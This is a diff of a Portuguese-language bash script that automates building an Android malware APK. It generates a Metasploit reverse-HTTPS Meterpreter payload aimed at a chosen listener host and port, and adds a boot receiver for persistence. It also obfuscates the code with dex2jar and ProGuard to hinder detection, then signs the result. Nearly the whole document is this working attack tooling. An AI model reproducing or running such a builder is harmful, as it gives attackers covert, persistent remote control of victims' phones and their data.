@@ -1,15 +1,102 @@
 #!/bin/bash
 
-echo "=== Gerador Automático de Payload Android com Persistência e Ofuscação ==="
-
-# Verifica se está rodando como root para instalações
-if [[ $EUID -ne 0 ]]; then
-   echo "Este script precisa ser executado como root para instalar dependências."
-   echo "Por favor, execute: sudo $0"
-   exit 1
+# Verifica se está rodando como root
+if [ "$EUID" -ne 0 ]; then
+    echo "Este script precisa ser executado como root para instalar dependências."
+    echo "Por favor, execute: sudo $0"
+    exit 1
 fi
 
-# Detecta IP local automaticamente (primeiro IP da lista)
+echo "=== Gerador Automático de Payload Android com Persistência e Ofuscação ==="
+
+# Função para instalar dex2jar globalmente
+install_dex2jar_global() {
+    if ! command -v d2j-dex2jar.sh &> /dev/null; then
+        echo "[*] dex2jar não encontrado. Instalando globalmente em /usr/local/dex2jar..."
+        mkdir -p /usr/local/dex2jar
+        wget -q -O /tmp/dex2jar.zip https://github.com/pxb1988/dex2jar/releases/download/2.0/dex2jar-2.0.zip
+        if [ $? -ne 0 ]; then
+            echo "Erro ao baixar dex2jar. Abortando."
+            exit 1
+        fi
+        unzip -q /tmp/dex2jar.zip -d /usr/local/dex2jar
+        rm /tmp/dex2jar.zip
+        echo "[*] dex2jar instalado em /usr/local/dex2jar/dex2jar-2.0"
+    else
+        echo "[*] dex2jar já instalado."
+    fi
+    export PATH="/usr/local/dex2jar/dex2jar-2.0:$PATH"
+    echo "[*] PATH atualizado para incluir dex2jar."
+}
+
+# Função para instalar apktool
+install_apktool() {
+    if ! command -v apktool &> /dev/null; then
+        echo "[*] apktool não encontrado. Instalando..."
+        apt update && apt install -y apktool
+        if [ $? -ne 0 ]; then
+            echo "Erro ao instalar apktool. Abortando."
+            exit 1
+        fi
+    else
+        echo "[*] apktool encontrado."
+    fi
+}
+
+# Função para instalar ProGuard
+install_proguard() {
+    if ! command -v proguard &> /dev/null; then
+        echo "[*] ProGuard não encontrado. Instalando..."
+        apt update && apt install -y proguard
+        if [ $? -ne 0 ]; then
+            echo "Erro ao instalar ProGuard. Abortando."
+            exit 1
+        fi
+    else
+        echo "[*] ProGuard encontrado."
+    fi
+}
+
+# Função para verificar apksigner
+check_apksigner() {
+    if ! command -v apksigner &> /dev/null; then
+        echo "[*] apksigner não encontrado. Instalando..."
+        apt update && apt install -y apksigner
+        if [ $? -ne 0 ]; then
+            echo "Erro ao instalar apksigner. Abortando."
+            exit 1
+        fi
+    else
+        echo "[*] apksigner encontrado."
+    fi
+}
+
+# Função para gerar keystore se não existir
+generate_keystore() {
+    if [ ! -f "$KEYSTORE" ]; then
+        echo "[*] Keystore não encontrado. Gerando novo keystore..."
+        keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 10000 -keystore "$KEYSTORE" -storepass changeit -keypass changeit -dname "CN=Payload,O=Pentest,C=BR"
+        if [ $? -ne 0 ]; then
+            echo "Erro ao gerar keystore."
+            exit 1
+        fi
+        echo "[*] Keystore gerado com sucesso."
+    else
+        echo "[*] Keystore encontrado."
+    fi
+}
+
+# Função para criar arquivo ProGuard
+create_proguard_config() {
+    cat > $PROGUARD_CONFIG <<EOF
+-dontoptimize
+-dontwarn **
+-keep class com.metasploit.stage.** { *; }
+-keep class $PACKAGE.** { *; }
+EOF
+}
+
+# Solicita dados do usuário
 DEFAULT_LHOST=$(hostname -I | awk '{print $1}')
 read -p "Informe o LHOST (IP do servidor) [${DEFAULT_LHOST}]: " LHOST
 LHOST=${LHOST:-$DEFAULT_LHOST}
@@ -19,7 +106,6 @@ while [[ -z "$LHOST" ]]; do
     LHOST=${LHOST:-$DEFAULT_LHOST}
 done
 
-# Sugere porta padrão 4444
 DEFAULT_LPORT=4444
 read -p "Informe o LPORT (porta do servidor) [${DEFAULT_LPORT}]: " LPORT
 LPORT=${LPORT:-$DEFAULT_LPORT}
@@ -53,98 +139,11 @@ OUTPUT_APK="app_payload_obf.apk"
 PROGUARD_CONFIG="proguard.cfg"
 MSF_RC="handler.rc"
 
-generate_keystore() {
-    echo "[*] Verificando keystore..."
-    if [ ! -f "$KEYSTORE" ]; then
-        echo "[*] Keystore não encontrado. Gerando novo keystore..."
-        keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 10000 -keystore "$KEYSTORE" -storepass changeit -keypass changeit -dname "CN=Payload,O=Pentest,C=BR"
-        if [ $? -ne 0 ]; then
-            echo "Erro ao gerar keystore."
-            exit 1
-        fi
-        echo "[*] Keystore gerado com sucesso."
-    else
-        echo "[*] Keystore encontrado."
-    fi
-}
-
-create_proguard_config() {
-    cat > $PROGUARD_CONFIG <<EOF
--dontoptimize
--dontwarn **
--keep class com.metasploit.stage.** { *; }
--keep class $PACKAGE.** { *; }
-EOF
-}
-
-install_apktool() {
-    if ! command -v apktool &> /dev/null; then
-        echo "[*] apktool não encontrado. Instalando..."
-        apt update && apt install -y apktool
-        if [ $? -ne 0 ]; then
-            echo "Erro ao instalar apktool. Abortando."
-            exit 1
-        fi
-    else
-        echo "[*] apktool encontrado."
-    fi
-}
-
-install_proguard() {
-    if ! command -v proguard &> /dev/null; then
-        echo "[*] ProGuard não encontrado. Instalando via apt..."
-        apt update && apt install -y proguard
-        if [ $? -ne 0 ]; then
-            echo "Erro ao instalar ProGuard."
-            return 1
-        fi
-    else
-        echo "[*] ProGuard encontrado."
-    fi
-    return 0
-}
-
-install_dex2jar() {
-    if ! command -x "$(command -v d2j-dex2jar.sh)" &> /dev/null; then
-        echo "[*] dex2jar não encontrado. Instalando manualmente..."
-
-        DEX2JAR_DIR="$HOME/dex2jar"
-        if [ ! -d "$DEX2JAR_DIR" ]; then
-            mkdir -p "$DEX2JAR_DIR"
-            echo "[*] Baixando dex2jar..."
-            wget -q -O /tmp/dex2jar.zip https://github.com/pxb1988/dex2jar/releases/download/2.0/dex2jar-2.0.zip
-            if [ $? -ne 0 ]; then
-                echo "Erro ao baixar dex2jar. Abortando ofuscação."
-                return 1
-            fi
-            unzip -q /tmp/dex2jar.zip -d "$DEX2JAR_DIR"
-            rm /tmp/dex2jar.zip
-        fi
-
-        # Adiciona o diretório correto ao PATH temporariamente
-        export PATH="$DEX2JAR_DIR/dex2jar-2.0:$PATH"
-        echo "[*] dex2jar instalado e PATH atualizado temporariamente."
-    else
-        echo "[*] dex2jar encontrado."
-    fi
-    return 0
-}
-
-check_apksigner() {
-    if ! command -v apksigner &> /dev/null; then
-        echo "[*] apksigner não encontrado."
-        echo "[*] Tentando instalar apksigner via apt (pacote apksigner)..."
-        apt update && apt install -y apksigner
-        if [ $? -ne 0 ]; then
-            echo "[!] Não foi possível instalar apksigner automaticamente."
-            echo "[!] Por favor, instale o Android SDK Build Tools e certifique-se que 'apksigner' está no PATH."
-            return 1
-        fi
-    else
-        echo "[*] apksigner encontrado."
-    fi
-    return 0
-}
+# Instala dependências
+install_apktool
+install_proguard
+check_apksigner
+install_dex2jar_global
 
 echo "[*] Gerando payload com msfvenom..."
 msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT R > $PAYLOAD_NAME
@@ -153,9 +152,6 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
-echo "[*] Verificando apktool..."
-install_apktool
-
 echo "[*] Descompilando APK com apktool..."
 apktool d $PAYLOAD_NAME -o $WORKDIR -f
 if [ $? -ne 0 ]; then
@@ -163,7 +159,6 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
-# Converte nome do pacote para formato smali (com barras)
 PACKAGE_SMALI=$(echo $PACKAGE | sed 's/\./\//g')
 BOOTRECEIVER_PATH="$WORKDIR/smali/$PACKAGE_SMALI"
 
@@ -224,46 +219,42 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
-echo "[*] Verificando ferramentas para ofuscação..."
-install_proguard
-install_dex2jar
-if [ $? -ne 0 ]; then
-    echo "[!] Falha na instalação das ferramentas. Pulando ofuscação."
-else
-    echo "[*] Iniciando ofuscação com ProGuard..."
+echo "[*] Iniciando ofuscação com ProGuard..."
 
-    mkdir -p temp_dex
-    unzip -o $OUTPUT_APK classes.dex -d temp_dex
+mkdir -p temp_dex
+unzip -o $OUTPUT_APK classes.dex -d temp_dex
 
-    # Usa o caminho completo para garantir execução
-    d2j-dex2jar.sh temp_dex/classes.dex -o temp_dex/classes.jar
-    if [ $? -ne 0 ]; then
-        echo "Erro ao converter dex para jar com dex2jar."
-        rm -rf temp_dex
-        exit 1
-    fi
+DEX2JAR_BIN="/usr/local/dex2jar/dex2jar-2.0/d2j-dex2jar.sh"
+JAR2DEX_BIN="/usr/local/dex2jar/dex2jar-2.0/d2j-jar2dex.sh"
 
-    proguard @${PROGUARD_CONFIG} -injars temp_dex/classes.jar -outjars temp_dex/classes_obf.jar
-
-    d2j-jar2dex.sh -o temp_dex/classes_obf.dex temp_dex/classes_obf.jar
-    if [ $? -ne 0 ]; then
-        echo "Erro ao converter jar para dex com dex2jar."
-        rm -rf temp_dex
-        exit 1
-    fi
-
-    zip -j $OUTPUT_APK temp_dex/classes_obf.dex
-
+if [ ! -x "$DEX2JAR_BIN" ] || [ ! -x "$JAR2DEX_BIN" ]; then
+    echo "Erro: dex2jar scripts não encontrados ou não executáveis."
     rm -rf temp_dex
+    exit 1
 fi
+
+"$DEX2JAR_BIN" temp_dex/classes.dex -o temp_dex/classes.jar
+if [ $? -ne 0 ]; then
+    echo "Erro ao converter dex para jar com dex2jar."
+    rm -rf temp_dex
+    exit 1
+fi
+
+proguard @${PROGUARD_CONFIG} -injars temp_dex/classes.jar -outjars temp_dex/classes_obf.jar
+
+"$JAR2DEX_BIN" -o temp_dex/classes_obf.dex temp_dex/classes_obf.jar
+if [ $? -ne 0 ]; then
+    echo "Erro ao converter jar para dex com dex2jar."
+    rm -rf temp_dex
+    exit 1
+fi
+
+zip -j $OUTPUT_APK temp_dex/classes_obf.dex
+
+rm -rf temp_dex
 
 echo "[*] Assinando APK..."
 generate_keystore
-check_apksigner
-if [ $? -ne 0 ]; then
-    echo "[!] Assinatura falhou: apksigner não disponível."
-    exit 1
-fi
 
 apksigner sign --ks $KEYSTORE --ks-key-alias $ALIAS --ks-pass pass:changeit --key-pass pass:changeit $OUTPUT_APK
 if [ $? -ne 0 ]; then
